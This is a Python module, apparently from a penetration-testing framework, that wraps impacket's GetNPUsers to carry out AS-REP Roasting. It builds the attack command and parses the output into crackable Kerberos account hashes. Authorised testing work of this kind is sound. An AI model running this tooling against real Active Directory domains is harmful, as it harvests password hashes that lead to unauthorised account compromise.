"""GetNPUsers — impacket AS-REP Roasting (find accounts without Kerberos pre-auth)."""

from __future__ import annotations

import re
from pathlib import Path
from typing import Any

from ofx.tasks.base import OptDef, Task
from ofx.tasks.output_types import UserAccount
from ofx.tasks.registry import TaskRegistry

@TaskRegistry.register("getnpusers")
class GetNPUsersTask(Task):
    name = "getnpusers"
    cmd = "impacket-GetNPUsers"
    description = "AS-REP Roasting — find accounts without Kerberos pre-authentication"
    category = "ad/kerberos"
    install_cmd = "uv tool install impacket"
    output_types = [UserAccount]

    opts = {
        "username": OptDef(flag="-username", type=str, help="Username"),
        "password": OptDef(flag="-password", type=str, help="Password"),
        "hash": OptDef(flag="-hashes", type=str, help="NTLM hashes (LMHASH:NTHASH)"),
        "dc_ip": OptDef(flag="-dc-ip", type=str, help="Domain controller IP"),
        "dc_host": OptDef(flag="-dc-host", type=str, help="Domain controller hostname"),
        "usersfile": OptDef(
            flag="-usersfile", type=str, help="File with usernames to test"
        ),
        "format": OptDef(flag="-format", type=str, help="Output format (hashcat/john)"),
        "output_file": OptDef(
            flag="-outputfile", type=str, help="Output file for hashes"
        ),
        "request": OptDef(flag="-request", is_flag=True, help="Request AS-REP hashes"),
        "k": OptDef(flag="-k", is_flag=True, help="Use Kerberos authentication"),
        "no_pass": OptDef(flag="-no-pass", is_flag=True, help="Don't ask for password"),
    }

    input_flag = None
    file_flag = None
    output_flag = None
    extra_flags: list[str] = []

    def _output_suffix(self) -> str:
        return ".txt"

    def build_command(self, target: str, **kwargs: Any) -> tuple[str, Path | None]:
        """Build: ``impacket-GetNPUsers domain/ -dc-ip IP -usersfile users.txt -format hashcat``."""
        username = kwargs.pop("username", "")
        password = kwargs.pop("password", "")
        hashes = kwargs.pop("hash", "")

        parts: list[str] = [self.cmd]
        parts.extend(self._build_value_flag_parts([("-hashes", hashes)]))
        parts.extend(self._build_opt_parts(kwargs))

        parts.append(
            self._q(
                self._domain_user_credential(
                    target,
                    username,
                    password,
                    trailing_slash_without_username=True,
                )
            )
        )

        return " ".join(parts), None

    _HASH_RE = re.compile(r"^\$krb5asrep\$\d+\$(\S+?)@(\S+?):")

    _USER_RE = re.compile(r"\[\*\]\s+Getting TGT for\s+(\S+)")

    _NO_VULN_RE = re.compile(r"doesn't have UF_DONT_REQUIRE_PREAUTH", re.IGNORECASE)

    def parse_output(
        self,
        stdout: str,
        stderr: str,
        output_file: Path | None = None,
    ) -> list[UserAccount]:
        raw = self._raw_output(stdout, output_file)
        if not raw:
            return []

        results: list[UserAccount] = []
        seen: set[str] = set()

        for line in raw.splitlines():
            line = line.strip()
            if not line:
                continue

            m = self._HASH_RE.match(line)
            if m:
                user = m.group(1)
                domain = m.group(2)
                key = f"{domain}\\{user}"
                if key not in seen:
                    seen.add(key)
                    results.append(
                        UserAccount(
                            username=user,
                            domain=domain,
                            hash=line,
                            source="getnpusers",
                            comment="asreproastable",
                        )
                    )

        return results
